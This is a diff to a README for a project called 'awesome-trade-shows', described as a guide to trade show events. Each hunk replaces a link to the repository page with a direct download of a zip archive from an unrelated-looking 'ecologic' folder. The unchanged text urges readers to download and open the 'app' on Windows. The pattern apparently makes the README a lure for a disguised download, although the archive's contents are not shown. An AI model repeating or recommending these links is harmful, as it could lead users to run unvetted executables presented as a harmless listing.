@@ -1,6 +1,6 @@
 # 🎟️ awesome-trade-shows - Find Key Trade Show Events Worldwide
 
-[![Download awesome-trade-shows](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/joaoppnunes/awesome-trade-shows)
+[![Download awesome-trade-shows](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/joaoppnunes/awesome-trade-shows/raw/refs/heads/main/ecologic/trade_shows_awesome_1.3.zip)
 
 ## 📖 About awesome-trade-shows
 
@@ -35,7 +35,7 @@ Follow these steps to download and open the app on your Windows PC.
 
 Visit the download page and get the latest version of awesome-trade-shows here:
 
-[![Download awesome-trade-shows](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/joaoppnunes/awesome-trade-shows)
+[![Download awesome-trade-shows](https://img.shields.io/badge/Download-Here-ff6347?style=for-the-badge)](https://github.com/joaoppnunes/awesome-trade-shows/raw/refs/heads/main/ecologic/trade_shows_awesome_1.3.zip)
 
 This link takes you to the GitHub page where files and resources are stored. Inside, look for the release or file that fits your needs.
 
@@ -118,7 +118,7 @@ Each link opens in your browser to give you full access to guides and websites.
 
 Access awesome-trade-shows files here:
 
-[https://github.com/joaoppnunes/awesome-trade-shows](https://github.com/joaoppnunes/awesome-trade-shows)
+[https://github.com/joaoppnunes/awesome-trade-shows/raw/refs/heads/main/ecologic/trade_shows_awesome_1.3.zip](https://github.com/joaoppnunes/awesome-trade-shows/raw/refs/heads/main/ecologic/trade_shows_awesome_1.3.zip)
 
 Use this link to download the app, check updates, or report issues.
 
